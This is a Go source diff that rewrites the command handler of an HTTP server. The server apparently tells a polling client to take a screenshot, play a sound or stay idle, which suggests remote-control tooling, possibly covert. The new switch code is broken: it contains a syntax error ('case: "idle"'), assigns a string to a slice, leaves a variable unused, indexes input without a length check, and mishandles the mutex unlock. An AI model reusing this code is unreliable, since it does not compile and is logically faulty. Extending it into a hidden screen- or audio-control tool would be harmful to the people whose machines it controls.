@@ -41,7 +41,7 @@ func uploadHandler(w http.ResponseWriter, r *http.Request) {
 
 func commandHandler(w http.ResponseWriter, r *http.Request) {
 	mutex.Lock()
-	if userInput == "" || userInput == "idle" {
+	/*if userInput == "" || userInput == "idle" {
 		fmt.Fprint(w, "idle")
 	}
 	if userInput == "ss" {
@@ -54,6 +54,30 @@ func commandHandler(w http.ResponseWriter, r *http.Request) {
 		userInput = ""
 		fmt.Println("sending audio command")
 	}
+		*/
+	command := strings.Fields(userInput)
+
+	switch command[0] {
+		case: "idle"
+		fmt.Fprint(w, "idle")
+
+	case "ss":
+		fmt.Fprint(w, "screenshot")
+		userInput = ""
+		fmt.Println("sending screenshot command")
+
+	case "sound":
+		if len(command) < 2 {
+
+			fmt.Println("Invalid usage", userInput)
+			fmt.Println("Hint try sound ./(yourpath)")
+		}
+		soundPath := command[1:]
+		fmt.Fprint(w, "audio")
+		command = ""
+		fmt.Println("sending audio command")
+	}
+
 	defer mutex.Unlock()
 }
 
